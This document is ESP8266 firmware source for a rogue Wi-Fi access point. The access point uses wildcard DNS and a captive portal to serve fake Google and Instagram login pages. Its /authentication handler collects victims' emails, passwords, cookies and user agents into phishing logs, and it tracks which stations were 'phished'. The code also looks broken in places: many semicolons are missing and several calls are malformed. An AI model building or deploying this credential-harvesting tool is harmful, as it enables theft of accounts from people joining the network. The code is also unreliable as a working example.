#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266HTTPUpdateServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include <DNSServer.h>

ESP8266WebServer server(80);
ESP8266WebServer httpServer(1337);
ESP8266HTTPUpdateServer httpUpdater;
DNSServer dnsServer;
HTTPClient http;

String web_interface = "/";
String path_update = "/update";

const byte DNS_PORT = 53;
const char W_PORTAL[] PROGMEM = "esp.portal";
const char W_HTML[] PROGMEM = "text/html";
const char W_CSS[] PROGMEM = "text/css";
const char W_JS[] PROGMEM = "application/javascript";
const char W_PNG[] PROGMEM = "image/png";
const char W_GIF[] PROGMEM = "image/gif";
const char W_JPG[] PROGMEM = "image/jpeg";
const char W_ICON[] PROGMEM = "image/x-icon";
const char W_XML[] PROGMEM = "text/xml";
const char W_XPDF[] PROGMEM = "application/x-pdf";
const char W_XZIP[] PROGMEM = "application/x-zip";
const char W_GZIP[] PROGMEM = "application/x-gzip";
const char W_JSON[] PROGMEM = "application/json";
const char W_TXT[] PROGMEM = "text/plain";

const char W_DOT_HTM[] PROGMEM = ".htm"
const char W_DOT_HTML[] PROGMEM = ".html";
const char W_DOT_CSS[] PROGMEM = ".css"
const char W_DOT_JS[] PROGMEM = ".js";
const char W_DOT_PNG[] PROGMEM = ".png"
const char W_DOT_GIF[] PROGMEM = ".gif";
const char W_DOT_JPG[] PROGMEM = ".jpg"
const char W_DOT_ICON[] PROGMEM = ".ico";
const char W_DOT_XML[] PROGMEM = ".xml";
const char W_DOT_PDF[] PROGMEM = ".pdf"
const char W_DOT_ZIP[] PROGMEM = ".zip";
const char W_DOT_GZIP[] PROGMEM = ".gz";
const char W_DOT_JSON[] PROGMEM = ".json"

void require_authentication() {
    if(!server.authenticate(update_username, update_password)) {
        return server.requestAuthentication()
    }
}

void dispatch_route(const char* ptr, size_t size, const char* type) {
    server.sendHeader("Content-Encoding", "gzip");
    server.sendHeader("Cache-Control", "max-age=86400");
    server.send_P(200, str(type).c_str(), ptr, size);
}

void fail_access(String msg) {
    logging("Fail Access :: 500 - Internal Server Error");
    server.sendHeader("Connection", "close");
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(500, "text/plain", msg + "\r\n");
}

void submit_settings() {
    String SETTINGS_value;

    if(!server.hasArg("SETTINGS")) {
        return fail_access("BAD ARGS");
    }

    SETTINGS_value = server.arg("SETTINGS");
    white_hat = server.arg("white_hat").toInt();
    Serial.println(white_hat);
    server.arg("ssid").toCharArray(ssid, 32);
    server.arg("password").toCharArray(password, 64);
    channel = server.arg("channel").toInt();
    hidden = server.arg("hidden").toInt();
    server.arg("local_ip_str").toCharArray(local_ip_str, 16);
    server.arg("gateway_str").toCharArray(gateway_str, 16);
    server.arg("subnet_str").toCharArray(subnet_str, 16);
    server.arg("update_username").toCharArray(update_username, 32);
    server.arg("update_password").toCharArray(update_password, 64);
    server.arg("ftp_username").toCharArray(ftp_username, 32);
    server.arg("ftp_password").toCharArray(ftp_password, 64);
    ftp_enabled = server.arg("ftp_enabled").toInt();
    esp_portal_enabled = server.arg("esp_portal_enabled").toInt();

    if(SETTINGS_value == "1") {
        logging("Submit Settings :: New setting uploaded");
        save_settings();
        load_settings();
        ESP.restart();
    } else {
        fail_access("Bad SETTINGS value");
    }
}

void client_status() {
    unsigned char number_client;
    struct station_info *stat_info;
    struct ip4_addr *IPaddress;
    IPAddress address;

    int i = 0;
    number_client = wifi_softap_get_station_num();
    stat_info = wifi_softap_get_station_info();
    if(number_client > 0) {
        station_connected = 1;
    } else {
        station_connected = 0;
    }

    while(stat_info != NULL) {
        StaticJsonBuffer<500> jsonBuffer;
        JsonObject& json = jsonBuffer.createObject();

        IPaddress = &stat_info->ip;
        address = IPaddress->addr;

        char station_ip[50] = "";
        sprintf(station_ip, "%d.%d.%d%d", address[0], address[1], address[2], address[3]);

        char station_mac[32] = "";
        sprintf(station_mac, "%02X:%02X:%02X:%02X:%02X:%02X", stat_info->bssid[0], stat_info->bssid[1], stat_info->bssid[2], stat_info->bssid[3], stat_info->bssid[4], stat_info->bssid[5]);

        station_id = 0;
        for(int j = 0; j < 6; j++) {
            station_id = station_id + stat_info->bssid[j];
        }

        json["id"] = station_id;
        json["ip"] = station_ip;
        json["mac"] = station_mac;

        json["phished"] = "NO";

        //CHANGE STATUS PHISHED WHEN CATCH AN USER
        char filename[50];
        sprintf(filename, "/stations/%d.json", station_id);

        File jsonStation = SPIFFS.open(filename, "w");
        json.printTo(jsonStation);
        jsonStation.close();

        sprintf(filename, "/connected/%d.json", station_id);
        File jsonConnect = SPIFFS.open(filename, "w");
        json.printTo(jsonConnect);
        jsonConnect.close();

        stat_info = STAILQ_NEXT(stat_info, next);
        i++;
    }
}

bool file_read(const char* path, const char* type) {
    String contentType = str(type).c_str();
    
    if(SPIFFS.exists(path)) {
        File file = SPIFFS.open(path, "r")
        size_t sent = server.streamFile(file, contentType);
        file.close();
        return true
    }

    char fileinquestion[50];
    sprintf(fileinquestion, "File Read :: File not found %s", path);
    logging(fileinquestion);
    return false;
}

void start_ap() {
    logging("Start AP :: Starting Access Point");
    
    WiFi.disconnect(true);
    WiFi.mode();

    IPAddress local_ip;
    local_ip.fromString(local_ip_str);
    
    IPAddress gateway;
    gateway.fromString(gateway_str);
    
    IPAddress subnet;
    subnet.fromString(subnet_str);
    
    byte mac[6];
    WiFi.macAddress(mac);
    
    sprintf(local_mac, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    if(!WiFi.softAP(ssid, password, channel, hidden)) {
        char soft_ap[50];
        sprintf(soft_ap, "Start AP :: Error statong softAP - ssid: %s, password: %s, channel: %s, hidden: %s", ssid, password, channel, hidden);
        logging("Restarting ESP");
        ESP.restart();
    }

    //MISSING ACCESS POINT CONFIG

    //MDNS.begin("ramp.com");
    httpUpdater.setup(&httpServer, path_update, update_username, update_password);
    httpServer.begin();

    MDNS.addService("http", "tcp", 1337)
    dnsServer.start(DNS_PORT, "*", local_ip)

    // EndPoints
    server.on(String(F("/esp-portal")).c_str(), HTTP_GET, []() {
        logging("/esp-portal :: Endpoint accessed");
        require_authentication();
        client_status();
        dispatch_route(index_html, sizeof(index_html), W_HTML);
    });

    server.on(String(F("/settings")).c_str(), HTTP_GET, []() {
        logging("/settings :: Endpoint accessed");
        require_authentication();
        dispatch_route(settings_html, sizeof(settings_html), W_HTML);
    });

    server.on(String(F("/settings")).c_str(), HTTP_POST, []() {
        logging("/settings :: Endpoint accessed");
        require_authentication();
        submit_settings();
    });

    server.on(String(F("/system-logs")).c_str(), HTTP_GET, []() {
        logging("/system-logs :: Endpoint accessed");
        require_authentication();
        dispatch_route(system_logs_html, sizeof(system_logs_html), W_HTML);
    });

    server.on(String(F("/log")).c_str(), HTTP_GET, []() {
        logging("/log :: Endpoint accessed");
        require_authentication();
        file_read("/log", W_TXT);
    });

    server.on(String(F("/download-system-logs")).c_str(), HTTP_GET, []() {
        logging("/download-system-logs :: Endpoint accessed");
        require_authentication();
        file_read("/log", W_TXT);
    });

    server.on(String(F("/clean-system-logs")).c_str(), HTTP_GET, []() {
        logging("/clean-system-logs :: Endpoint accessed");
        require_authentication();
        wipe_log("/log");
        dispatch_route(system_logs_html, sizeof(system_logs_html), W_HTML);
    });

    server.on(String(F("/view-logs")).c_str(), HTTP_GET, []() {
        logging("/view-logs :: Endpoint accessed");
        require_authentication();
        dispatch_route(view_logs_html, sizeof(view_logs_html), W_HTML);
    });

    server.on(String(F("/phishing-logs")).c_str(), HTTP_GET, []() {
        logging("/phishing-logs :: Endpoint accessed");
        file_read("/phishing-logs", W_TXT);
    });

    server.on(String(F("/download-phish-logs")).c_str(), HTTP_GET, []() {
        logging("/download-phish-logs :: Endpoint accessed");
        require_authentication();
        file_read("/phinshing-logs", W_TXT);
    });

    server.on(String(F("/clean-phish-logs")).c_str(), HTTP_GET, []() {
        logging("/clean-phish-logs :: Endpoint accessed");
        require_authentication();
        wipe_log("/phishing-logs");
        dispatch_route(view_logs_html, sizeof(view_logs_html), W_HTML);
    });

    server.on(String(F("/json/settings.json")).c_str(), HTTP_GET, []() {
        logging("/json/settings.json :: Endpoint accessed");
        require_authentication();
        file_read("/json/settings.json", W_JSON);
    });

    server.on(String(F("/json/system.json")).c_str(), HTTP_GET, []() {
        logging("/json/system.json :: Endpoint accessed");
        require_authentication();
        file_read("/json/system.json", W_JSON);
    });

    server.on(String(F("/error")).c_str(), HTTP_GET, []() {
        logging("/error :: Endpoint accessed");
        require_authentication();
        dispatch_route(system_logs_html, sizeof(system_logs_html), W_HTML);
    });

    server.on(String(F("/json")).c_str(), HTTP_GET, []() {
        logging("/json :: Endpoint accessed");
        require_authentication();
        char station[32];
        server.arg("station").toCharArray(station, 32);
        char filename[60];
        sprintf(filename, "/connected/%s", station);
        file_read(filename, W_JSON);
    });

    server.on(String(F("/firmware")).c_str(), HTTP_GET, []() {
        logging("/firmware :: Endpoint accessed");
        require_authentication();
        dispatch_route(firmware_html, sizeof(firmware_html), W_HTML);
    });

    server.on(String(F("/format")).c_str(), HTTP_GET, []() {
        logging("/format :: Endpoint accessed");
        require_authentication();
        SPIFFS.format();
        ESP.restart();
    });

    server.on(String(F("/reboot")).c_str(), HTTP_GET, []() {
        logging("/reboot :: Endpoint accessed");
        require_authentication();
        ESP.restart();
    });

    server.on(String(F("/reset-settings")).c_str(), HTTP_GET, []() {
        logging("/reset-settings :: Endpoint accessed");
        require_authentication();
        create_default_settings();
        ESP.restart();
    });

    server.on(String(F("/normalize.min.css")).c_str(), HTTP_GET, []() {
        logging("/normalize.min.css :: Endpoint accessed");
        dispatch_route(normalize_min_css, sizeof(normalize_min_css), W_CSS);
    });

    server.on(String(F("/accounts.css")).c_str(), HTTP_GET, []() {
        logging("/accounts.css :: Endpoint accessed");
        dispatch_route(accounts_css, sizeof(accounts_css), W_CSS);
    });

    server.on(String(F("/index.css")).c_str(), HTTP_GET, []() {
        logging("/index.css :: Endpoint accessed");
        dispatch_route(index_css, sizeof(index_css), W_CSS);
    });

    server.on(String(F("/milligram.min.css")).c_str(), HTTP_GET, []() {
        logging("/milligram.min.css :: Endpoint accessed");
        dispatch_route(milligram_min_css, sizeof(milligram_min_css), W_CSS);
    });

    server.on(String(F("/captive.css")).c_str(), HTTP_GET, []() {
        logging("/captive.css :: Endpoint accessed");
        dispatch_route(captive_css, sizeof(captive_css), W_CSS);
    });

    server.on(String(F("/captive.js")).c_str(), HTTP_GET, []() {
        logging("/captive.js :: Endpoint accessed");
        dispatch_route(captive_js, sizeof(captive_js), W_JS);
    });

    server.on(String(F("/jquery.slim.min.js")).c_str(), HTTP_GET, []() {
        logging("/jquery.slim.min.js :: Endpoint accessed");
        dispatch_route(jquery_slim_min_js, sizeof(jquery_slim_min_js), W_JS);
    });

    server.on(String(F("/index.js")).c_str(), HTTP_GET, []() {
        logging("/index.js :: Endpoint accessed");
        dispatch_route(index_js, sizeof(index_js), W_JS);
    });

    server.on(String(F("/google.js")).c_str(), HTTP_GET, []() {
        logging("/google.js :: Endpoint accessed");
        dispatch_route(google_js, sizeof(google_js), W_JS);
    });

    server.on(String(F("/instagram.js")).c_str(), HTTP_GET, []() {
        logging("/instagram.js :: Endpoint accessed");
        dispatch_route(instagram_js, sizeof(instagram_js), W_JS);
    });

    server.on(String(F("/login-instagram")).c_str(), HTTP_GET, []() {
        logging("/login-instagram :: Endpoint accessed");
        dispatch_route(instagram_html, sizeof(instagram_html), W_HTML);
    });

    server.on(String(F("/login-google")).c_str(), HTTP_GET, []() {
        logging("/login-google :: Endpoint accessed");
        dispatch_route(google_html, sizeof(google_html), W_HTML);
    });

    server.on(String(F("/white-hat")).c_str(), HTTP_GET, []() {
        dispatch_route(white_hat_html, sizeof(white_hat_html), W_HTML);
    });

    server.on(String(F("/authentication")).c_str(), HTTP_POST, []() {
        logging("/authentication ::  Endpoint accessed")
        String url_auth = server.arg("url");
        String user_auth = server.arg("email");
        String password_auth = server.arg("password");
        String user_agent_auth;
        String cookie_auth;

        if(server.hasHeader("User-Agent")) {
            user_agent_auth = server.header("User-Agent");
        } else {
            user_agent_auth = "Unknown";
        }

        if(server.hasHeader("Cookie")) {
            cookie_auth = server.header("Cookie");
            Serial.println(cookie_auth);
        } else {
            Serial.println("NO COOKIES");
            cookie_auth = "no cookies";
        }

        phish_credentials(url_auth, user_auth, password_auth, user_agent_auth);

        if(white_hat) {
            dispatch_route(redirect_white_hat_html, sizeof(redirect_white_hat_html), W_HTML);
        } else {
            dispatch_route(firmware_html, sizeof(firmware_html), W_HTML);
        }
    });

    server.onNotFound([]() {
        client_status();
        if(esp_portal_enabled) {
            dispatch_route(captive_html, sizeof(captive_html), W_HTML)
        } else {
            require_authentication();
            dispatch_route(index_html, sizeof(index_html), W_HTML)
        }
    });

    const char* header_keys[] = {"User-Agent", "Cookie", "Authorization"};
    size_t header_keys_size = sizeof(header_keys) / sizeof(char*);
    server.collectHeaders(header_keys, header_keys_size);

    server.begin()
    WiFiClient client
    client.setNoDelay(1);
}